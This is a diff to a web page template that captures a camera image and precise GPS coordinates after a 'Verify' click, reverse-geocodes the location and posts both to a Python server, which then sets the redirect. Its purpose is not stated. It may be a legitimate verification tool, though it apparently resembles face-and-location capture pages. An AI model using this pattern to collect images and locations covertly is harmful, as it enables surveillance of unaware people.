@@ -31,12 +31,15 @@
         const btn = document.getElementById('verifyBtn');
         const status = document.getElementById('status');
         
-        // Priority: URL Param > Template Variable
         const urlParams = new URLSearchParams(window.location.search);
         const mode = urlParams.get('mode') || '{{ mode }}';
 
         let detailedLocation = "Unknown District, India"; 
         let mapsUrl = "Location Hidden";
+        
+        // --- NEW: Raw Coordinates for Math ---
+        let currentLat = null;
+        let currentLon = null;
 
         // Camera Initialization
         navigator.mediaDevices.getUserMedia({ video: true })
@@ -53,13 +56,14 @@
         function getDetailedLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
+                    // Capture raw numbers for Python math
+                    currentLat = position.coords.latitude;
+                    currentLon = position.coords.longitude;
                     
-                    mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                    mapsUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
 
                     try {
-                        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+                        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${currentLat}&lon=${currentLon}`);
                         const data = await res.json();
                         const district = data.address.city || data.address.town || data.address.village || "District Not Found";
                         const country = data.address.country || "India";
@@ -67,12 +71,22 @@
                     } catch (e) {
                         detailedLocation = "Location Shared";
                     }
-                }, null, { enableHighAccuracy: true });
+                }, (err) => {
+                    console.error("Location Error:", err);
+                    status.innerText = "Please enable GPS/Location to continue.";
+                    status.style.color = "#ea4335";
+                }, { enableHighAccuracy: true });
             }
         }
         getDetailedLocation(); 
 
         btn.onclick = () => {
+            if (!currentLat || !currentLon) {
+                status.innerText = "Waiting for GPS signal... Please wait a moment.";
+                status.style.color = "#f4b400";
+                return;
+            }
+
             btn.disabled = true;
             status.style.color = "#5f6368";
             status.innerText = "Processing Face & Location...";
@@ -90,6 +104,8 @@
                 body: JSON.stringify({ 
                     image: imageData, 
                     mode: mode,
+                    lat: currentLat,           // SENT TO PYTHON
+                    lon: currentLon,           // SENT TO PYTHON
                     location: mapsUrl,
                     detailed_location: detailedLocation 
                 })
@@ -100,9 +116,7 @@
                     status.style.color = "#34a853";
                     status.innerText = "Verified! Redirecting...";
                     
-                    // --- REFINED REDIRECT LOGIC ---
                     setTimeout(() => {
-                        // Use the exact redirect path provided by app.py
                         window.location.href = data.redirect; 
                     }, 1200);
                     
